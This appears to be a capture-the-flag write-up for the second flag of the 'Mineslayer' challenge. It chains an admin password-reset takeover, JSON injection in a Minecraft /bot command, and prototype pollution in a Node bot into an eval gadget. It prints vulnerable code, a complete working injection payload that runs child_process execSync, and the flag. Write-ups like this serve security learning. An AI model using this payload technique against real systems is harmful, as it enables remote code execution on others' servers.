---
tags:
  - midnightctf
  - web
  - misc
  - pwn
---

# Mineslayer — Flag 2

This page is the full follow-up for the second Mineslayer flag. The short version is:

1. force a privileged password reset on `Administrator`
2. predict the new password
3. log in as the freshly re-op'd admin account
4. abuse `/bot` JSON injection
5. turn that into prototype pollution inside the Node bot
6. reach a code-generation gadget and execute `/getflag`

## Why the first flag was only half the solve

The `/flag` command only printed the easy flag:

```java
sender.sendMessage(MM.deserialize("[<yellow>FLAG_1</yellow>]: <bold>" + this.flag + "</bold>"));
```

The real target sat behind a SUID helper that read `/root/flag.txt`, so the job for `FLAG_2` was to get code execution in a process that could run `/getflag`.

## Reusing the admin takeover

The first part of the chain stayed the same as on the main writeup:

- abuse the MiniMessage nick mismatch
- trigger `/renew Administrator`
- predict the next password in the deterministic RNG sequence
- log in as `Administrator`

That mattered because the interesting command was admin-only:

```text
/bot <commands>
```

## `/bot` was a JSON injection sink

The command turned user input into a JSON array without escaping quotes:

```java
String[] commands = input.split(";");
List<String> cmdList = new ArrayList<>();
for (String cmd : commands) {
    String trimmed = cmd.trim();
    if (!trimmed.isEmpty()) cmdList.add(trimmed);
}

StringBuilder jsonArray = new StringBuilder("[");
for (int i = 0; i < cmdList.size(); i++) {
    if (i > 0) jsonArray.append(",");
    jsonArray.append("\"").append(cmdList.get(i)).append("\"");
}
jsonArray.append("]");
```

So a payload could break out of the array and inject arbitrary top-level JSON fields into the bot config.

## The Node merge gave prototype pollution

On the Node side, the injected JSON was merged recursively:

```javascript
function merge(target, source) {
    for (let key of Object.keys(source)) {
        typeof target[key] !== "undefined" && typeof source[key] === "object"
            ? target[key] = merge(target[key], source[key])
            : target[key] = source[key]
    }
    return target
}
```

This gave two useful prototype-walk options:

- `__proto__` to reach `Object.prototype`
- `username.constructor.prototype` to reach `String.prototype`

The challenge was not just getting pollution, but getting pollution that survived long enough to hit a useful code path.

## The important gadget was in protocol compilation

The bot stack eventually reached `protodef`, which compiled generated code through `eval`:

```javascript
compile (code) {
  const native = this.native
  const { PartialReadError } = require('./utils')
  return eval(code)()
}
```

That turned the problem into a classic exploit question: can polluted values be threaded far enough through the library stack to splice attacker-controlled JavaScript into generated code before `eval(code)()` runs?

The answer was yes, but only after shaping the polluted prototype data to satisfy the compiler path.

## Working payload

The payload that finally worked remotely was:

```text
/bot a"],"__proto__":{"0":"(console.log(require('child_process').execSync('/getflag',{encoding:'utf8'})),0)"},"username":{"constructor":{"prototype":{"minecraftVersion":"1.0.0","majorVersion":"1.0","name":"_","type":"varint"}}},"version":"1.21.8","x":["b
```

In practice that payload:

- broke out of the serialized command list
- injected top-level JSON fields
- polluted `Object.prototype["0"]` with a JavaScript expression
- polluted `String.prototype` through `username.constructor.prototype`
- forced a concrete protocol version so the library stack reached the right compiler path

When the bot reached the gadget, it executed:

```javascript
require('child_process').execSync('/getflag', { encoding: 'utf8' })
```

The plugin then forwarded bot stdout back into the Minecraft chat, which made exfiltration trivial.

## Final result

```text
MCTF{Th4ts_4_sh1t_t0n_0f_g4dg3t}
```

## Why this chain was interesting

The clean path was not a direct shell injection. It was:

- trusted chat rendering bug
- privileged password reset
- deterministic password prediction
- JSON injection
- prototype pollution
- code-generation gadget
- `eval`
- SUID helper execution

That combination is what made Mineslayer memorable.
